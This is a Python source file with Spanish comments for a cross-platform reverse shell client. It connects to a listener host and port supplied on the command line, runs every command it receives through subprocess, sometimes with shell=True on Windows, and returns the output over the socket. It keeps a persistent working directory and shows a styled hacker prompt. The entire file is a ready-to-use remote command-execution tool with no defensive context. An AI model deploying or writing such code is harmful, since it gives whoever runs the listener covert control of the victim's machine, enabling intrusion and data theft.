#!/usr/bin/env python3

import socket
import shlex
import subprocess
import argparse
import sys
import os
import platform

DELIM = b"<<<END_OF_OUTPUT>>>\n"

# ANSI colors para el prompt (puedes cambiarlos o poner vacíos)
ANSI_RESET = "\033[0m"
ANSI_GREEN = "\033[1;32m"
ANSI_BLUE = "\033[1;34m"

# Detectar el sistema operativo
IS_WINDOWS = platform.system().lower() == 'windows'

def get_shell():
    """Retorna el shell apropiado según el SO"""
    if IS_WINDOWS:
        return 'cmd.exe'
    else:
        return '/bin/bash'

def normalize_path(path):
    """Normaliza paths para el SO actual"""
    if IS_WINDOWS:
        return os.path.normpath(path).replace('/', '\\')
    else:
        return os.path.normpath(path)

def get_home_dir():
    """Obtiene el directorio home según el SO"""
    if IS_WINDOWS:
        return os.path.expanduser("~") or os.environ.get('USERPROFILE', 'C:\\')
    else:
        return os.path.expanduser("~")

def exec_command(cmd_list, cwd=None, timeout=600):
    try:
        # En Windows, algunos comandos necesitan ser ejecutados a través del shell
        if IS_WINDOWS:
            # Comandos internos de cmd que necesitan shell=True
            internal_cmds = ['dir', 'type', 'echo', 'set', 'del', 'copy', 'move', 'md', 'rd', 'cls', 'vol', 'date', 'time']
            if cmd_list and cmd_list[0].lower() in internal_cmds:
                # Para comandos internos de Windows, usar shell=True
                cmd_str = ' '.join(cmd_list)
                proc = subprocess.run(
                    cmd_str,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    cwd=cwd,
                    shell=True,
                    check=False
                )
            else:
                # Para comandos externos, usar la lista directamente
                proc = subprocess.run(
                    cmd_list,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    cwd=cwd,
                    check=False
                )
        else:
            # En Linux, mantener el comportamiento original
            proc = subprocess.run(
                cmd_list,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd,
                check=False
            )
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"Timeout after {timeout}s"
    except FileNotFoundError:
        return -1, "", f"Command not found: {cmd_list[0] if cmd_list else 'unknown'}"
    except PermissionError:
        return -1, "", f"Permission denied: {cmd_list[0] if cmd_list else 'unknown'}"
    except Exception as e:
        return -1, "", f"Execution error: {e}"

def recv_line(sock):
    """Recibe bytes hasta '\\n'. Devuelve str sin '\\n' o None si conexión cerrada."""
    buf = bytearray()
    while True:
        try:
            chunk = sock.recv(1)
        except socket.timeout:
            continue
        except Exception:
            return None
        if not chunk:
            return None
        if chunk == b'\n':
            break
        buf += chunk
    return buf.decode(errors='replace')

def send_payload(sock, pieces):
    """Envía una lista de bytes/str piezas y luego el delimitador."""
    out = bytearray()
    for p in pieces:
        if isinstance(p, str):
            out += p.encode(errors='replace')
        elif isinstance(p, bytes):
            out += p
        else:
            out += str(p).encode()
    out += DELIM
    try:
        sock.sendall(out)
    except Exception as e:
        print(f"[-] Error sending output: {e}", file=sys.stderr)

def build_prompt(cwd, use_color=True, short=True):
    """Construye el prompt manteniendo el estilo original"""
    if use_color:
        return f"{ANSI_GREEN}4zt3c4{ANSI_BLUE}$5e1ver:~#{ANSI_RESET} "
    else:
        return "4zt3c4$5e1ver:~# "

def handle_cd_command(parts, current_cwd):
    """Maneja el comando cd de forma compatible entre SO"""
    target = parts[1] if len(parts) > 1 else get_home_dir()
    
    try:
        target_expanded = os.path.expanduser(os.path.expandvars(target))
        if not os.path.isabs(target_expanded):
            newpath = normalize_path(os.path.join(current_cwd, target_expanded))
        else:
            newpath = normalize_path(target_expanded)
            
        if os.path.isdir(newpath):
            return newpath, f"cd -> {newpath}\n", True
        else:
            return current_cwd, f"cd: no such directory: {target}\n", False
    except Exception as e:
        return current_cwd, f"cd error: {e}\n", False

def main():
    parser = argparse.ArgumentParser(description="Cross-platform reverse executor with persistent cd and nice prompt.")
    parser.add_argument("--host", "-H", required=True, help="IP/host of the listener (your machine)")
    parser.add_argument("--port", "-p", required=True, type=int, help="Port of the listener")
    parser.add_argument("--timeout", "-t", type=int, default=600, help="Command timeout (s)")
    parser.add_argument("--no-color", dest="no_color", action="store_true", help="Disable ANSI colors in prompt")
    parser.add_argument("--long-prompt", dest="long_prompt", action="store_true", help="Show full cwd in prompt (long)")
    args = parser.parse_args()

    use_color = not args.no_color
    short_prompt = not args.long_prompt

    # cwd local del proceso (comienza en el cwd actual en remoto)
    cwd = os.getcwd()
    
    # Mostrar información del sistema al iniciar
    os_info = f"Running on {platform.system()} {platform.release()}"
    print(f"[+] {os_info}")

    try:
        with socket.create_connection((args.host, args.port)) as s:
            s.settimeout(None)
            # Al conectar, enviar un saludo y el prompt
            welcome = f"Connected to listener {args.host}:{args.port} - {os_info}\n"
            try:
                s.sendall(welcome.encode(errors='replace'))
            except Exception:
                pass

            # enviar prompt inicial
            try:
                prompt = build_prompt(cwd, use_color=use_color, short=short_prompt)
                s.sendall(prompt.encode(errors='replace'))
            except Exception:
                pass

            print(f"[+] Connected to {args.host}:{args.port}. Waiting for commands...")
            while True:
                line = recv_line(s)
                if line is None:
                    print("[*] Connection closed by listener.")
                    break
                cmd = line.strip()
                if cmd == "":
                    # ignore empty lines
                    # still re-send prompt so the listener sees it
                    prompt = build_prompt(cwd, use_color=use_color, short=short_prompt)
                    try:
                        s.sendall(prompt.encode(errors='replace'))
                    except Exception:
                        pass
                    continue

                # Manejar cd y pwd localmente
                try:
                    parts = shlex.split(cmd)
                except Exception:
                    parts = [cmd]

                verb = parts[0] if parts else ""
                if verb.lower() in ("exit", "quit"):
                    print("[*] Received exit. Closing.")
                    break

                if verb == "cd":
                    new_cwd, output, success = handle_cd_command(parts, cwd)
                    cwd = new_cwd
                    send_payload(s, [output])
                    # after cd, send prompt
                    prompt = build_prompt(cwd, use_color=use_color, short=short_prompt)
                    s.sendall(prompt.encode(errors='replace'))
                    continue

                if verb == "pwd":
                    send_payload(s, [f"{cwd}\n"])
                    # after pwd, send prompt
                    prompt = build_prompt(cwd, use_color=use_color, short=short_prompt)
                    s.sendall(prompt.encode(errors='replace'))
                    continue

                # Para otros comandos, ejecutarlos en cwd
                try:
                    args_list = shlex.split(cmd)
                except Exception:
                    send_payload(s, [f"Failed to parse command: {cmd}\n"])
                    prompt = build_prompt(cwd, use_color=use_color, short=short_prompt)
                    s.sendall(prompt.encode(errors='replace'))
                    continue

                return_code, out, err = exec_command(args_list, cwd=cwd, timeout=args.timeout)

                pieces = []
                pieces.append(f"=== CMD: {cmd}\n")
                pieces.append(f"=== EXIT CODE: {return_code}\n")
                if out:
                    pieces.append("--- STDOUT ---\n")
                    pieces.append(out)
                    if not out.endswith("\n"):
                        pieces.append("\n")
                if err:
                    pieces.append("--- STDERR ---\n")
                    pieces.append(err)
                    if not err.endswith("\n"):
                        pieces.append("\n")
                if not out and not err:
                    pieces.append("[No output]\n")

                # send result + delimiter
                send_payload(s, pieces)

                # finally send the prompt again so listener sees it
                prompt = build_prompt(cwd, use_color=use_color, short=short_prompt)
                try:
                    s.sendall(prompt.encode(errors='replace'))
                except Exception:
                    # if prompt can't be sent, keep going; next iteration will try again
                    pass

    except ConnectionRefusedError:
        print(f"[-] Could not connect to {args.host}:{args.port}")
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

if __name__ == "__main__":
    main()